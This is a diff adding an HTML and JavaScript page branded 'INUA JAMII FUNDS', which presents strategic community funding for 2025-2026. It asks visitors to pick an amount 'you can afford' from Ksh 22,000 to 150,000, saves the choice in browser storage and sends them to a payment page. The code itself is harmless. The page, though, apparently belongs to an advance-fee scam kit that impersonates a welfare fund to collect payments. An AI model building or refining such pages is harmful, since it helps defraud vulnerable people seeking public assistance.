@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>INUA JAMII FUNDS - Funds Selection</title>
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&amp;display=swap" rel="stylesheet" />
+<style>
+    @media(max-width: 480px){
+  body {
+    zoom: 0.8; /* Optional: slightly zoom out for small screens */
+  }
+  .card {
+    transform: scale(0.9); /* Scale down the card */
+    transform-origin: top; /* Optional: scale from the top */
+  }
+    }
+  body {
+    margin: 0;
+    font-family: 'Raleway', sans-serif;
+    /* Green gradient background with overlay (same as index3) */
+    background: linear-gradient(135deg, #4CAF50, #81C784);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+  }
+
+  /* Optional overlay for darkening background for better contrast */
+  body::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.2);
+    z-index: -1;
+  }
+
+  .card {
+    background: #fff;
+    width: 95%;
+    max-width: 950px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    padding: 40px 30px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 30px;
+  }
+
+  .header h1 {
+    font-size: 2.5em;
+    font-weight: 700;
+    color: #00695c;
+    margin-bottom: 20px;
+  }
+
+  /* Subtitle / description box */
+  .info-box {
+    background: #e3f2fd;            /* light blue background */
+    border-radius: 10px;
+    padding: 16px 20px;
+    text-align: center;
+    color: #1565c0;
+    font-size: 1em;
+    line-height: 1.5;
+    margin-bottom: 30px;
+  }
+
+  /* Amount buttons grid */
+  .amounts-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    margin-bottom: 10px;
+  }
+
+  /* Amount pill button (default: teal filled pill) */
+  .amount-btn {
+    position: relative;             /* required for the ::after checkmark */
+    background-color: #0f9d8c;
+    color: #fff;
+    border: 2px solid transparent;
+    border-radius: 30px;
+    padding: 14px 20px;
+    font-size: 1.05em;
+    font-weight: 700;
+    font-family: 'Raleway', sans-serif;
+    cursor: pointer;
+    transition: background-color 0.2s, border-color 0.2s, transform 0.15s;
+  }
+
+  .amount-btn:hover {
+    background-color: #0b8274;
+    transform: translateY(-2px);
+  }
+
+  /* Selected (active) state - orange, matching index3 pattern */
+  .amount-btn.active {
+    background-color: #fff4e5;       /* light orange tint */
+    border: 2px solid #ff6b00;       /* solid orange border */
+    color: #333;
+  }
+
+  .amount-btn.active::after {
+    content: "✓";
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    width: 20px;
+    height: 20px;
+    background-color: #ff6b00;
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: bold;
+  }
+
+  /* Error message style (same pattern as index3) */
+  .error-message {
+    color: #d32f2f;
+    font-size: 0.85em;
+    margin-top: 4px;
+    display: none;
+  }
+
+  .error-message.show {
+    display: block;
+  }
+
+  /* Continue to Payment submit button (pale mint pill) */
+  .submit-btn {
+    background-color: #2e7d32;   /* dark green */
+    color: #ffffff;
+    border: none;
+    border-radius: 30px;         /* fully rounded pill shape */
+    padding: 14px 20px;          /* matches .amount-btn sizing conventions */
+    font-size: 1.05em;
+    font-weight: 500;            /* regular/medium weight */
+    font-family: 'Raleway', sans-serif;
+    width: 100%;
+    cursor: pointer;
+    text-align: center;
+    transition: background-color 0.2s;
+    margin-top: 20px;
+  }
+
+  .submit-btn:hover {
+    background-color: #1b5e20;   /* darker green on hover */
+  }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    margin-top: 50px;
+    font-size: 1em;
+    color: #fff;
+  }
+
+  /* Responsive grid adjustments (same breakpoints as index3) */
+  @media(max-width: 768px){
+    .amounts-grid {
+      grid-template-columns: repeat(2, 1fr);
+    }
+  }
+
+  @media(max-width: 480px){
+    .amounts-grid {
+      grid-template-columns: 1fr;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <h1>Funds Selection!</h1>
+    <div class="info-box">
+      Supporting communities with Strategic Funding for 2025-2026.<br />
+      Select the amount you can afford to process quickly!
+    </div>
+  </div>
+
+  <!-- Amount selection form -->
+  <form id="fundForm" novalidate>
+    <div class="amounts-grid">
+    <button type="button" class="amount-btn" data-value="22000">Ksh 22,000</button>
+    <button type="button" class="amount-btn" data-value="30300">Ksh 30,300</button>
+    <button type="button" class="amount-btn" data-value="40800">Ksh 40,800</button>
+    <button type="button" class="amount-btn" data-value="50000">Ksh 50,000</button>
+    <button type="button" class="amount-btn" data-value="65300">Ksh 65,300</button>
+    <button type="button" class="amount-btn" data-value="75000">Ksh 75,000</button>
+    <button type="button" class="amount-btn" data-value="85000">Ksh 85,000</button>
+    <button type="button" class="amount-btn" data-value="110000">Ksh 110,000</button>
+    <button type="button" class="amount-btn" data-value="150000">Ksh 150,000</button>
+    </div>
+
+    <!-- Error message -->
+    <div class="error-message" id="error-amount">Please select an amount first.</div>
+
+    <!-- Continue to Payment button -->
+    <button type="submit" class="submit-btn">Continue to Payment</button>
+  </form>
+
+  <div class="footer">
+    🇰🇪 INUA JAMII FUNDS - Transforming Lives 🇰🇪
+  </div>
+</div>
+<script>
+(function() {
+  const amountBtns = document.querySelectorAll('.amount-btn');
+  const errorEl = document.getElementById('error-amount');
+
+  function selectAmount(btn) {
+    // Remove active from all, then mark the clicked one (radio-button style)
+    amountBtns.forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+
+    // Hide the validation error once a choice is made
+    errorEl.className = 'error-message';
+
+    // Merge into the existing saved object (same pattern as index3)
+    let dataToSave = {};
+    try {
+      const existing = localStorage.getItem('nyota_finalData');
+      if (existing) {
+        dataToSave = JSON.parse(existing);
+      }
+    } catch(e) {
+      // ignore parsing errors, start fresh
+    }
+    dataToSave.fund_amount = btn.dataset.value;
+    dataToSave.timestamp = new Date().toISOString();
+    localStorage.setItem('nyota_finalData', JSON.stringify(dataToSave));
+  }
+
+  // On page load, pre-select the saved amount if it exists
+  const savedData = localStorage.getItem('nyota_finalData');
+  if (savedData) {
+    try {
+      const data = JSON.parse(savedData);
+      if (data && data.fund_amount) {
+        amountBtns.forEach(btn => {
+          if (btn.dataset.value === data.fund_amount) {
+            btn.classList.add('active');
+          }
+        });
+      }
+    } catch(e) {
+      // ignore parsing errors
+    }
+  }
+
+  // Click handler: single-select
+  amountBtns.forEach(btn => {
+    btn.addEventListener('click', () => selectAmount(btn));
+  });
+
+  // Submit handler: validate, then save + redirect
+  document.getElementById('fundForm').addEventListener('submit', e => {
+    e.preventDefault();
+
+    const selected = document.querySelector('.amount-btn.active');
+
+    // a. Validate that an amount has been selected
+    if (!selected) {
+      errorEl.className = 'error-message show';
+      return; // b. do NOT proceed
+    }
+
+    // c. Save is already handled by selectAmount() on click; ensure it's persisted
+    let dataToSave = {};
+    try {
+      const existing = localStorage.getItem('nyota_finalData');
+      if (existing) dataToSave = JSON.parse(existing);
+    } catch(err) {
+      // ignore parsing errors
+    }
+    dataToSave.fund_amount = selected.dataset.value;
+    dataToSave.timestamp = new Date().toISOString();
+    localStorage.setItem('nyota_finalData', JSON.stringify(dataToSave));
+
+    // d. Redirect to the next step
+    window.location.href = 'payment1.html';
+  });
+})();
+</script>
+
+</body>
+
+
+</html>
